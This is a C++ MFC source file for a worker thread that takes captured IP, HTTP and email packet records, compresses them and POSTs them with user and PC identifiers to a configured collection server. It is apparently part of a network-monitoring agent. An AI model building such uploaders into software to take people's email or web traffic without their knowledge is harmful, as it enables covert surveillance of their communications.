// SendDataThread.cpp : 实现文件
//
#include "SendDataThread.h"
#include <iostream>
#ifdef _DEBUG
#define new DEBUG_NEW
#endif

// SendDataThread
IMPLEMENT_DYNCREATE(SendDataThread, CWinThread)
SendDataThread::SendDataThread()
{
	EnableAutomation();
}

SendDataThread::~SendDataThread()
{
}

void SendDataThread::OnFinalRelease()
{
	// 释放了对自动化对象的最后一个引用后，将调用
	// OnFinalRelease。基类将自动
	// 删除该对象。在调用该基类之前，请添加您的
	// 对象所需的附加清理代码。

	CWinThread::OnFinalRelease();
}

BOOL SendDataThread::InitInstance()
{
	// TODO: 在此执行任意逐线程初始化
	BOOL worked=CWinThread::InitInstance();


	pConnection=NULL;
	session = NULL;

	CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
	MSG msg;
	PeekMessage(&msg, NULL, WM_USER, WM_USER, PM_NOREMOVE);
	return TRUE;
}

int SendDataThread::ExitInstance()
{
	// TODO: 在此执行任意逐线程清理
	return CWinThread::ExitInstance();
}

BEGIN_MESSAGE_MAP(SendDataThread, CWinThread)
	ON_THREAD_MESSAGE(SENDDATA_REC_IPMESSAGE,OnReceiveIPMessage)
	ON_THREAD_MESSAGE(SENDDATA_REC_HTTPMESSAGE,OnReceiveHttpMessage)
	ON_THREAD_MESSAGE(SENDDATA_REC_EMAILMESSAGE,OnReceiveEmailMessage)
END_MESSAGE_MAP()

BEGIN_DISPATCH_MAP(SendDataThread, CWinThread)
END_DISPATCH_MAP()

// 注意: 我们添加 IID_ISendDataThread 支持
//  以支持来自 VBA 的类型安全绑定。此 IID 必须同附加到 .IDL 文件中的
//  调度接口的 GUID 匹配。

// {E30FAAC4-A3C0-4706-8166-1939F4086642}
static const IID IID_ISendDataThread =
{ 0xE30FAAC4, 0xA3C0, 0x4706, { 0x81, 0x66, 0x19, 0x39, 0xF4, 0x8, 0x66, 0x42 } };

BEGIN_INTERFACE_MAP(SendDataThread, CWinThread)
	INTERFACE_PART(SendDataThread, IID_ISendDataThread, Dispatch)
END_INTERFACE_MAP()


// SendDataThread 消息处理程序
void SendDataThread::OnReceiveIPMessage(WPARAM wParam, LPARAM lParam)
{
	vector<IpPacket> *ipvector = (vector<IpPacket> *)lParam;
	//send ip packet
	SendToServer(ipvector,NULL,NULL,IPTYPE);
	ipvector->clear();
	delete ipvector;
}
void SendDataThread::OnReceiveHttpMessage(WPARAM wParam, LPARAM lParam)
{
	vector<HttpPacket> *httpvector = (vector<HttpPacket> *)lParam;
	//send http packet
	SendToServer(NULL,NULL,httpvector,HTTPTYPE);
	httpvector->clear();
	delete httpvector;
}
void SendDataThread::OnReceiveEmailMessage(WPARAM wParam, LPARAM lParam) 
{
	vector<EmailPacket> *emailvector = (vector<EmailPacket> *)lParam;
	//send email packet
	SendToServer(NULL,emailvector,NULL,MAILTYPE);
	emailvector->clear();
	delete emailvector;
}



void SendDataThread::SendToServer(vector<IpPacket> *vectorip,vector<EmailPacket> *vectoremail,vector<HttpPacket> *vectorhttp,int packettype)
{
	vector<IpPacket> *vector_ippacket=NULL;
	vector<EmailPacket>  *vector_email=NULL;
	vector<HttpPacket> *vector_httppacket=NULL;
	string sendbuff("");
	string packetbuff("");
	int send_length=0;
	switch(packettype)
	{
	case IPTYPE:vector_ippacket= vectorip;
				AssemblePacket(vector_ippacket,IPTYPE);
				break;
	case HTTPTYPE:vector_httppacket = vectorhttp;
		         AssemblePacket(vector_httppacket,HTTPTYPE);
				/*while(!vector_httppacket->empty())
				{ 
					packetbuff.clear();
					vector_httppacket->back().SerializeToString(&packetbuff); 
					if(std::string::npos!=packetbuff.find("Strings must contain only UTF-8"))
					{
						cout<<"catch the error"<<endl;
					}
					vector_httppacket->pop_back(); 
					send_length+=packetbuff.length()+3; 
					if(send_length>MAXSIZEDATA) 
					{ 
						SendDataToServer(sendbuff,HTTPTYPE);
						sendbuff.clear(); 
						send_length=packetbuff.length()+3; 
					} 
					sendbuff+=packetbuff; 
					sendbuff+="!!!"; 
				} 
				if(send_length) 
				{ 
					SendDataToServer(sendbuff,HTTPTYPE); 
					sendbuff.clear(); 
					send_length=0; 
				} */	  
				break;
	case MAILTYPE:vector_email = vectoremail;
				  AssemblePacket(vector_email,MAILTYPE);				  
				  break;     

	default:return ;
	}
	vector_ippacket=NULL;
	vector_email=NULL;
	vector_httppacket=NULL;
}

bool SendDataThread::ConnectToServer()
{
	static int stick = 0;
	string host_str("");
	int port = 0;
	try
	{
		if(session)
		{
			session->Close();
			delete session;
			session = NULL;
		}
		if(pConnection)
		{

			pConnection->Close();
			delete pConnection;
			pConnection = NULL;
		}
		session = new CInternetSession;
		session->SetOption(INTERNET_OPTION_CONNECT_TIMEOUT, 1000 * 20);
		session->SetOption(INTERNET_OPTION_CONNECT_BACKOFF, 1000);
		session->SetOption(INTERNET_OPTION_CONNECT_RETRIES, 1);
		host_str = AppConfig::SharedInstance()->GetHostIp();
		port = AppConfig::SharedInstance()->GetPort();
		pConnection = session->GetHttpConnection( host_str.c_str(),(INTERNET_PORT)port);
		stick = 0;
		return TRUE;
	}
	catch (CInternetException* e)
	{
		e->ReportError();
		if(stick<4)
		{
			stick++;
			return ConnectToServer();
		}
		else
		{
			stick = 0;
			session->Close();
			delete session;
			session = NULL;
			pConnection->Close();
			delete pConnection;
			pConnection = NULL;
			return FALSE;
		}
	}
}

/*void SendDataThread::test(ext_string ext_test)
{
	ext_string ext_parse;
	int found;
	while(std::string::npos!=(found = ext_test.find("!!!")))
	{
		ext_parse=ext_test.substr(0,found);
		HttpPacket ip_test;
		ip_test.ParseFromString(ext_parse);
		string printstr;
		google::protobuf::TextFormat::PrintToString(ip_test,&printstr);
		cout<<printstr<<endl;
		ext_test=ext_test.substr(found+3,ext_test.length()-found-3);
	}
}
*/

void SendDataThread::SendDataToServer(string senddata,int sendtype)
{
	string sendpath("");
	string sendcompress("");
	string userid = AppConfig::SharedInstance()->GetUserID();
	string pcid = AppConfig::SharedInstance()->GetPcID();
	if(userid.empty() || pcid.empty())
		return ;
	string sendbuffer("");
	static int stick = 0;
	static int count_send =0;
	snappy::Compress(senddata.data(),senddata.size(),&sendcompress);
	sendbuffer+="userid=";
	sendbuffer+=userid;
	sendbuffer+="&";
	sendbuffer+="pcid=";
	sendbuffer+=pcid;
	sendbuffer+="&";
	sendbuffer+="type=";
	switch(sendtype)
	{
	case IPTYPE:sendbuffer+="1";break;
	case MAILTYPE:sendbuffer+="2";break;
	case HTTPTYPE:sendbuffer+="3";break;
	default:return ;
	}
	sendbuffer+="&";
	sendbuffer+="data=";
	sendbuffer+=sendcompress;
	//CLogMod::SharedInstance()->LogInfo("sendbuffer.c_str()");
	if(!pConnection)
	{
		if(!ConnectToServer())
		{
			stick =0;
			return ;
		}
	}
	sendpath="/put/pc/packets/";
	CHttpFile* pFile= NULL;
	try
	{
		pFile = pConnection->OpenRequest( CHttpConnection::HTTP_VERB_POST,
			sendpath.c_str(),
			NULL,
			1,
			NULL,
			"HTTP/1.1",
			INTERNET_FLAG_RELOAD);
		if(pFile==NULL)
		{
			stick = 0;
			if(session)
			{
				session->Close();
				delete session;
				session = NULL;
			}
			if(pConnection)
			{

				pConnection->Close();
				delete pConnection;
				pConnection = NULL;
			}
			return;
		}
	}
	catch (CInternetException* e)
	{
		pFile->Close();
		pFile = NULL;
		if(session)
		{
			session->Close();
			delete session;
			session = NULL;
		}
		if(pConnection)
		{

			pConnection->Close();
			delete pConnection;
			pConnection = NULL;
		}
		if(stick<4)
		{
			stick++;
			SendDataToServer(senddata,sendtype);
		}
		else
		{
			stick = 0;
			return ;
		}
	}
	
	//需要提交的数据
    CString szHeaders   = "Content-Type: application/x-www-form-urlencoded;";
	//下面这段编码，则是可以让服务器正常处理
	//CHAR* strFormData = "username=WaterLin&password=TestPost";
	try
	{
		if(pFile->SendRequest( szHeaders,
			szHeaders.GetLength(),
			(LPVOID)sendbuffer.c_str(),
			sendbuffer.length())==0)
		{
			cout<<"calling fails"<<endl;
			return ;
		}
		cout<<count_send++<<"send ok"<<endl;
		stick = 0;
		pFile->Close();
		pFile= NULL;
		Releaseinfo("send ok");
		
	}
	catch (CInternetException* e)
	{
		pFile->Close();
		pFile=NULL;
		if(session)
		{
			session->Close();
			delete session;
			session = NULL;
		}
		if(pConnection)
		{

			pConnection->Close();
			delete pConnection;
			pConnection = NULL;
		}
		//e->GetErrorMessage(szCause,255);
		//cout<<"eeror:"<<szCause<<endl;
		if(stick<4)
		{
			stick++;
			SendDataToServer(senddata,sendtype);
		}
		else
		{
			stick = 0;
			return ;
		}
	}
	//CLogMod::SharedInstance()->LogInfo("SendDataToServer.c_str()");	
}